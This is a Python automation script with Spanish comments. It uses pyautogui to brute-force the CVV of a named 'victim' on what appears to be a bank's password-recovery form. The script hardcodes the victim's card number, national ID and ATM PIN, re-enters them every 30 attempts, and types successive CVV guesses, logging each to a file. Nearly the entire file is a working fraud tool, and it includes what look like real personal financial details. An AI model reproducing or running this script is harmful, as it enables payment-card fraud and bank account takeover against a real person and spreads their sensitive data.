import pyautogui as robot
import time 
from os import system
import pyttsx3 #voz

olvidecontra = 1614, 269
Ndocumento = 1461, 301
Ntarjeta = 1489,362
Nclavecajero = 1477,555
CVV = 1404,451
continuar = 1634,648
reintentar = 1623,982
primercontinuar = 1629,340
escape = 1895,87
cuadro_continuar = robot.locateOnScreen('ContinuarCuadro.png')
cuadro_CVV = robot.locateOnScreen('cuadro_cvv.png', confidence=0.9)

victima_tar = "4919098266158845"
victima_dni = "25793946"
victima_pasw = "1976"
#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")
#voz
engine = pyttsx3.init()
engine.setProperty("rate",150)
#text = "holaaaaaaaaaaaa"
#engine.say(text)
#engine.runAndWait()
#Pedir datos

inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	robot.click(clicks=click)

#Logeandose primero
numerodedocumento = robot.locateOnScreen('NumeroDeDocumento.png', confidence=0.9)
abrir(numerodedocumento)
time.sleep(0.5)
robot.typewrite(victima_dni)
time.sleep(0.5)
abrir(primercontinuar)
time.sleep(1)


abrir(olvidecontra,click=1)
time.sleep(0.5)
abrir(olvidecontra,click=1)
time.sleep(0.5)

#Registrar datos:
abrir(Ndocumento)
robot.typewrite(victima_dni)
time.sleep(0.5)
abrir(Ntarjeta)
robot.typewrite(victima_tar)
time.sleep(0.5)
abrir(Nclavecajero)
robot.typewrite(victima_pasw)
time.sleep(0.5)

#ccv intento
abrir(CVV)
robot.typewrite(str(inicio)) #tipear
abrir(continuar)
time.sleep(3)
abrir(reintentar)
time.sleep(2)

print(":D")
#tx1 ="Iniciando"
#engine.say(tx1)
contador = 0 # para reiniciar 
registro = open("registro.txt","a")
try:
	while inicio<fin :  # >  <
		contador = contador + 1
		if contador/30 == 1 :
			print("Reiniciando, esperar por favor")
			abrir(escape)
			time.sleep(2)

			numerodedocumento = robot.locateOnScreen('NumeroDeDocumento.png', confidence=0.9)
			#Llenando datos
			abrir(numerodedocumento)
			time.sleep(0.5)
			robot.typewrite(victima_dni)
			time.sleep(0.5)
			abrir(primercontinuar)
			time.sleep(1)

			abrir(olvidecontra,click=1)
			time.sleep(0.5)
			abrir(olvidecontra,click=1)
			time.sleep(0.5)
			#Registrar datos:
			abrir(Ndocumento)
			robot.typewrite(victima_dni)
			time.sleep(0.5)
			abrir(Ntarjeta)
			robot.typewrite(victima_tar)
			time.sleep(0.5)
			abrir(Nclavecajero)
			robot.typewrite(victima_pasw)
			time.sleep(0.5)
			print("Continuando...")
			contador=0

		print("Intentado con: ",inicio)

		#abrir(cuadro_cvv) # Confirmar de que exista dicho cuadro
		abrir(CVV,click=2) # doble click
		time.sleep(1.5)

		inicio = inicio + 1
		robot.typewrite(str(inicio))
		time.sleep(2)

		registro.write(str(inicio)) # escribir en el block
		registro.write("\n")

		abrir(continuar)
		time.sleep(3)
		#No es pe
		abrir(reintentar)
		time.sleep(2)
		#time.sleep(2)
	
	print("Intentado con: ",inicio)
	registro.close()
	print("Programa finalizado con exito")
	txt= "Programa finalizado con exito"
	engine.say(txt)
	engine.runAndWait()
except:
	registro.close()
	robot.alert("ERROR")
	txt= "Error en el programa"
	engine.say(txt)
	engine.runAndWait()
	print(txt)
	print("\nEl numero se quedó en: ", inicio)
	time.sleep(10)





